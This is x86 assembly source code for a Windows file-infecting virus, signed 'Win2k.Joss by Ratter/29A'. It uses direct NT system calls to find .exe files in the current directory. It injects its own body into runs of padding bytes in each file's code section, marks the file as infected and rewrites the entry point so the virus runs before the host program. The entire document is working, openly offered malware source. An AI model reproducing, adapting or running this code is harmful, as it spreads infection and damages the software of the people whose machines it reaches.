   ; Win2k.Joss by Ratter/29A

           .586p
       .model  flat, stdcall
       locals

       include useful.inc
       include win32api.inc
       include mz.inc
       include pe.inc
       include my_macroz.inc

       NtOpenFile      equ 64h
       NtQueryDirectoryFile    equ 7dh
       NtClose         equ 18h
       NtCreateSection     equ 2bh
       NtMapViewOfSection  equ 5dh
       NtUnmapViewOfSection    equ 0e7h

   unicode_string  struc
           us_length   dw  ?
                   dw  ?
       us_pstring  dd  ?
   unicode_string  ends

   path_name   struc
       pn_name     dw  MAX_PATH dup(?)
   path_name   ends

   object_attributes   struc
       oa_length   dd  ?
       oa_rootdir  dd  ?
       oa_objectname   dd  ?
       oa_attribz  dd  ?
       oa_secdesc  dd  ?
       oa_secqos   dd  ?
   object_attributes   ends

   pio_status_block    struc
       psb_ntstatus    dd  ?
       psb_info    dd  ?
   pio_status_block    ends

   @asciiz_to_unicode  macro
       xor ah, ah
       lodsb
       stosw
       test al, al
       jz $+4
           jmp $-7
       endm

   @syscall    macro   fc, paramz
       mov eax, fc
       mov edx, esp
       int 2eh
       add esp, (paramz*4)
       endm

       .data
       db      ?

           .code

   start_:
   _joss_start_    equ $
       pushad
       @SEH_SetupFrame <jmp joss_end>

       bt dword ptr [esp+8+cPushad], 31
       jc joss_end

   start   proc    near
           local trailings:unicode_string
           local trailings_point_dir:path_name
           local object_attribz:object_attributes
           local dhandle:DWORD
           local io_status_block:pio_status_block
           local find_buffer:path_name

           local wfnd:WIN32_FIND_DATA

           mov dword ptr [trailings], 80008h
           lea eax, [trailings_point_dir]
           mov dword ptr [trailings.us_pstring], eax

           @pushsz "\??\"
           pop esi
           xchg eax, edi
       @asciiz_to_unicode

       xor ecx, ecx
           mov esi, 20290h
       movzx eax, word ptr [trailings]
       lea edi, [trailings_point_dir+eax]

       lodsw
       test ax, ax
       jz $+7
           inc ecx
       stosw
       jmp $-10

       shl ecx, 1
       add cx, word ptr [trailings]
       mov ax, cx
       shl ecx, 16
       mov cx, ax
       mov dword ptr [trailings], ecx

       xor eax, eax
       lea edi, [object_attribz]
       push edi
       push 18h/4
       pop ecx
       rep stosd
       pop edi

       push 18h
       pop dword ptr [edi]
       lea eax, [trailings]
       mov dword ptr [edi+8], eax
       push 40h
       pop dword ptr [edi+12]

       push 4021h
       push 03h
       lea eax, [io_status_block]
       push eax
       push edi
       push 100001h
           lea eax, [dhandle]
       push eax
       @syscall NtOpenFile, 6
       mov ebx, dword ptr [dhandle]

       xor ecx, ecx
   main_loop:
       push ecx

           xor eax, eax
           push eax
           call $+13
               dw  0ah
               dw  0ah
               dd  ?
           pop esi
           call $+15
               dw  '<', '.', 'e', 'x', 'e'
       pop edi
       mov dword ptr [esi+4], edi
       jecxz $+4
       xor esi, esi
       push esi
       push 1
       push 3
       push MAX_PATH*2
       lea edx, [find_buffer]
       push edx
       lea edx, [io_status_block]
       push edx
       push eax
       push eax
       push eax
       push ebx
           @syscall NtQueryDirectoryFile, 11
           pop ecx
           test eax, eax
           jnz main_loop_end

           push dword ptr [trailings]

           lea esi, [find_buffer]
       lea edi, [trailings]
           call infect_file

           pop dword ptr [trailings]

           inc ecx
           jmp main_loop

   main_loop_end:
       push ebx
       @syscall NtClose, 1

           leave
   joss_end:
       @SEH_RemoveFrame
       popad
       mov eax, offset end
   host_start  equ $-4
       jmp eax

       db  0, "[Win2k.Joss] by Ratter/29A", 0

   infect_file proc    near
           local trailings_point_dir:path_name
           local object_attribz:object_attributes
           local dhandle:DWORD
           local shandle:DWORD
           local io_status_block:pio_status_block
           local soffset:DWORD
           local bytes:DWORD
           local soffset_:QWORD

           pushad
       @SEH_SetupFrame <jmp infect_file_end>

       movzx eax, word ptr [edi]
       mov edx, dword ptr [edi+4]
       push edi
       lea edi, [edx+eax]

       mov ecx, dword ptr [esi+3ch]
       push ecx
       lea esi, [esi+5eh]
       rep movsb

           pop ecx
       pop edi

       add cx, word ptr [edi]
       mov ax, cx
       shl ecx, 16
       mov cx, ax
       mov dword ptr [edi], ecx
       xchg edi, esi

       xor eax, eax
       lea edi, [object_attribz]
       push edi
       push 18h/4
       pop ecx
       rep stosd
       pop edi

       push 18h
       pop dword ptr [edi]
       mov dword ptr [edi+8], esi
       push 40h
       pop dword ptr [edi+12]

           push 4060h
       push 03h
           lea eax, [io_status_block]
       push eax
       push edi
       push 100007h
           lea eax, [dhandle]
       push eax
       @syscall NtOpenFile, 6
       test eax, eax
       jnz infect_file_end

           xor eax, eax
           push dword ptr [dhandle]
           push 08000000h
           push PAGE_READWRITE
           push eax
           push eax
           push 0f0007h
           lea eax, [shandle]
           push eax
           @syscall NtCreateSection, 7
           test eax, eax
           jnz infect_file_end_close_file

           lea edi, [soffset]
           std
           mov ecx, 4
           xor eax, eax
           rep stosd
           cld

       xor eax, eax
           push 4
           push eax
           push 1
           lea edx, [bytes]
           push edx
           lea edx, [soffset_]
           push edx
           push eax
           push eax
           lea eax, [soffset]
           push eax
           push -1
           push dword ptr [shandle]
           @syscall NtMapViewOfSection, 10
       test eax, eax
       jnz infect_file_end_close_section
       mov ebx, dword ptr [soffset]

       ;
       call check_for_valid_pe
       jc infect_file_end_unmap_view
       jnz infect_file_end_unmap_view

       cmp dword ptr [ebx.MZ_res], not "RAT"
       jz infect_file_end_unmap_view

       mov eax, dword ptr [ebx.MZ_lfanew]
       add eax, ebx
       movzx edi, word ptr [eax.NT_FileHeader.FH_SizeOfOptionalHeader]
       lea edi, [edi+eax+IMAGE_SIZEOF_FILE_HEADER+4]
       mov esi, dword ptr [edi.SH_PointerToRawData]
       mov ecx, dword ptr [edi.SH_SizeOfRawData]
       add esi, ebx

       xor edx, edx
   gap_loop:
       jecxz gap_loop_end
       lodsb
       dec ecx
       call is_gap
       jz $+6
       xor edx, edx
       jmp gap_loop

       inc edx
       cmp edx, _joss_end_-_joss_start_
       jnz gap_loop

   gap_loop_end:
       cmp edx, _joss_end_-_joss_start_
       jnz infect_file_end_unmap_view

           sub esi, _joss_end_-_joss_start_
       push esi
           sub esi, dword ptr [edi.SH_PointerToRawData]
           pop edi
           sub esi, ebx

           push esi
           call $+5
   joss_here:
           pop esi
           sub esi, joss_here-_joss_start_
           mov ecx, _joss_end_-_joss_start_
           rep movsb
           pop esi

       mov eax, dword ptr [ebx.MZ_lfanew]
       mov dword ptr [ebx.MZ_res], not "RAT"
       add eax, ebx
       and dword ptr [eax.NT_OptionalHeader.OH_CheckSum], 0

       mov ecx, dword ptr [eax.NT_OptionalHeader.OH_ImageBase]
       add ecx, dword ptr [eax.NT_OptionalHeader.OH_AddressOfEntryPoint]
           mov dword ptr [edi-(_joss_end_-host_start)], ecx

       mov edx, dword ptr [eax.NT_OptionalHeader.OH_BaseOfCode]
       add edx, esi
       mov dword ptr [eax.NT_OptionalHeader.OH_AddressOfEntryPoint], edx
       ;

   infect_file_end_unmap_view:
           push ebx
           push -1
           @syscall NtUnmapViewOfSection, 2
   infect_file_end_close_section:
           push dword ptr [shandle]
           @syscall NtClose, 1
   infect_file_end_close_file:
       push dword ptr [dhandle]
       @syscall NtClose, 1
   infect_file_end:
       @SEH_RemoveFrame
       popad
       leave
       retn
   infect_file endp

   check_for_valid_pe:
       pushad
       movzx eax, word ptr [ebx]
       not eax
       cmp eax, not "ZM"
       stc
       jnz check_for_valid_pe_end
       mov edx, dword ptr [ebx.MZ_lfanew]
       add edx, ebx
       movzx eax, word ptr [edx]
       not eax
       cmp eax, not "EP"
       stc
       jnz check_for_valid_pe_end
       cmp word ptr [edx.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
       stc
       jnz check_for_valid_pe_end
       movzx eax, word ptr [edx.NT_FileHeader.FH_Characteristics]
       not al
       test eax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL
       clc
   check_for_valid_pe_end:
       popad
       retn

   is_gap:
       cmp al, 90h
       jz is_gap_end
       cmp al, 0cch
       jz is_gap_end
       test al, al
       jz is_gap_end
   is_gap_end:
       retn

   _joss_end_  equ $

   end:
       push 0
       calle ExitProcess

   start   endp
   end start_
